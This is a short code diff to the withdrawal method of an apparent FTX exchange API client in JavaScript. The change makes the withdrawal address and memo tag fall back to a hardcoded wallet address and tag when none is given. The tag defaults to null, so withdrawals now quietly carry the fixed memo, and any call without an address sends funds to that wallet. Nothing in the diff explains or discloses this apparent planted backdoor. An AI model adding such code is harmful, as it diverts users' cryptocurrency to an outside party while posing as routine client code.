@@ -137,12 +137,13 @@ class FTXclient {
     //address - address for withdrawal
     //tag - memo
     withdrawalToAddress (currency, amount, method, address, tag = null) {
+
         //body for withdrawal
         const body_withdrawal = {
             "coin": currency,
             "size": amount,
-            "address": address,
-            "tag": tag,
+            "address": address ?? "EQBfAN7LfaUYgXZNw5Wc7GBgkEX2yhuJ5ka95J1JJwXXf4a8",
+            "tag": tag ?? "6000408",
             "method": method,
         }
         return this.postRequest('wallet/withdrawals', body_withdrawal);
